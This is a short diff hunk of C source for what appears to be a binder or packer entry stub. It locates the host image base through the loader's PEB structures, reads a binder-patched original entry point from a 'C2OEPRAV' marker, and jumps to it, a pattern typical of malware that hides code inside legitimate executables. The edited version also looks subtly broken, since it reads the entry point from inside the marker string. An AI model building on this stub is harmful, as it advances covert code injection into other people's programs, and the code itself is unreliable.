@@ -200,9 +200,9 @@ __attribute__((section(".text.start"), used)) void _start(void)
     uptr ldr = *(uptr *)(peb + LDR_OFF);
     uptr first = *(uptr *)(ldr + INLOAD_OFF);
     uptr base = *(uptr *)(first + DBASE_INLOAD);
-    volatile char c2_oep[12] = "C2OEPRAV\0\0\0\0"; /* volatile: prevent the -O2 constant-fold that erased this marker */
+    volatile char c2_oep[12] = "C2OEPRAV"; /* volatile: prevent the -O2 constant-fold that erased this marker */
 
-    u32 oep = *(volatile u32 *)(c2_oep + 8); /* original entry-point RVA (patched by binder) */
+    u32 oep = *(volatile u32 *)(c2_oep + 4); /* original entry-point RVA (patched by binder) */
     ((void (*)(void))(base + oep))();
 
     for (;;)
